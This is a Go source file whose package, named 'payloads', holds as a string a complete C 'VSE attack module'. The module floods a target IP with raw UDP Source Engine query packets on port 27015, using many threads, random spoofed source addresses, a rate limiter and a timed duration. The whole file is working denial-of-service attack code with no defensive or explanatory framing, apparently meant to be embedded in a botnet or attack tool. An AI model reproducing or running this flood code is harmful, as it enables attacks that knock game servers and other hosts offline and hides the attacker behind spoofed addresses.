package payloads

var VSE = `
// ==================== VSE ATTACK MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE_VSE 4096
#define PHI_VSE 0x9e3779b9

static unsigned long int Q_vse[4096], c_vse = 362436;
volatile int limiter_vse;
volatile unsigned int pps_vse;
volatile unsigned int sleeptime_vse = 100;
static int vse_attack_running = 0;
static pthread_t vse_threads[100];

void init_rand_vse(unsigned long int x) {
    int i;
    Q_vse[0] = x;
    Q_vse[1] = x + PHI_VSE;
    Q_vse[2] = x + PHI_VSE + PHI_VSE;
    for (i = 3; i < 4096; i++){ Q_vse[i] = Q_vse[i - 3] ^ Q_vse[i - 2] ^ PHI_VSE ^ i; }
}

unsigned long int rand_cmwc_vse(void) {
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q_vse[i] + c_vse;
    c_vse = (t >> 32);
    x = t + c_vse;
    if (x < c_vse) { x++; c_vse++; }
    return (Q_vse[i] = r - x);
}

unsigned short csum_vse(unsigned short *buf, int count) {
    register unsigned long sum = 0;
    while( count > 1 ) { sum += *buf++; count -= 2; }
    if(count > 0) { sum += *(unsigned char *)buf; }
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (unsigned short)(~sum);
}

void *vse_flood(void *arg) {
    char *target_ip = (char *)arg;
    char datagram[MAX_PACKET_SIZE_VSE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(27015);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(s < 0) return NULL;
    
    memset(datagram, 0, MAX_PACKET_SIZE_VSE);
    iph->ihl = 5; iph->version = 4; iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 25;
    iph->id = htonl(54321); iph->frag_off = 0; iph->ttl = 255;
    iph->protocol = IPPROTO_UDP; iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100"); iph->daddr = sin.sin_addr.s_addr;
    
    udph->source = htons(27015); udph->dest = htons(27015); udph->check = 0;
    void *data = (void *)udph + sizeof(struct udphdr);
    memset(data, 0xFF, 4);
    strcpy((char*)data+4, "TSource Engine Query");
    udph->len = htons(sizeof(struct udphdr) + 25);
    iph->check = csum_vse((unsigned short *)datagram, iph->tot_len);
    
    int tmp = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp));
    init_rand_vse(time(NULL));
    register unsigned int i = 0;
    
    while(vse_attack_running) {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        iph->saddr = (rand_cmwc_vse() >> 24 & 0xFF) << 24 | (rand_cmwc_vse() >> 16 & 0xFF) << 16 | (rand_cmwc_vse() >> 8 & 0xFF) << 8 | (rand_cmwc_vse() & 0xFF);
        iph->id = htonl(rand_cmwc_vse() & 0xFFFFFFFF);
        iph->check = csum_vse((unsigned short *)datagram, iph->tot_len);
        pps_vse++;
        if(i >= limiter_vse) { i = 0; usleep(sleeptime_vse); }
        i++;
    }
    close(s);
    return NULL;
}

void start_vse_attack(char *target, int threads, int duration_sec) {
    if(vse_attack_running) return;
    vse_attack_running = 1;
    limiter_vse = 0; pps_vse = 0; sleeptime_vse = 100;
    for(int i = 0; i < threads; i++) {
        pthread_create(&vse_threads[i], NULL, vse_flood, strdup(target));
    }
    sleep(duration_sec);
    vse_attack_running = 0;
    for(int i = 0; i < threads; i++) {
        pthread_join(vse_threads[i], NULL);
    }
}

void stop_vse_attack() { vse_attack_running = 0; }
// ==================== END VSE MODULE ====================
`